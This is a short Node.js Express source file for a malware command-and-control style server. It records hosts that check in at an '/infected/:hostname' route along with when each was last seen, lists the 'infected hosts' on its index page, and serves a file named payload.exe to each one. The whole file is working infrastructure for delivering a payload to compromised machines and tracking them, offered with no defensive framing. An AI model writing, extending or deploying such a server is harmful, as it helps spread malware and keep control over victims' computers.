var fs = require('fs');
var moment = require('moment');
var express = require('express');
var app = express();

var infected_hosts = [];
var payload_name = "payload.exe";
var listening_port = 4242;

app.get('/', function (req, res) {
    // My eyes - They burn !
    var nb_infected_hosts = 0;
    var list_infected_hosts = "";
    var html_result = "";
    for (var infected_host in infected_hosts) {
        nb_infected_hosts++;
        list_infected_hosts += "<b>" + infected_host + "</b> : " + moment(infected_hosts[infected_host]).fromNow() + "<br>";
    }

    html_result += "Number of infected hosts: " + nb_infected_hosts + "<br>" + list_infected_hosts;

    res.send(html_result);
});

app.get('/infected/:hostname', function (req, res) {
    infected_hosts[req.params.hostname] = new Date();

    fs.readFile(payload_name, function (err, data) {
        if (err) {
            res.sendStatus(404);
            return console.log(err);
        }

        res.send(data);
    });
});

app.listen(listening_port, function () {
  console.log('Server listening on port ' + listening_port);
});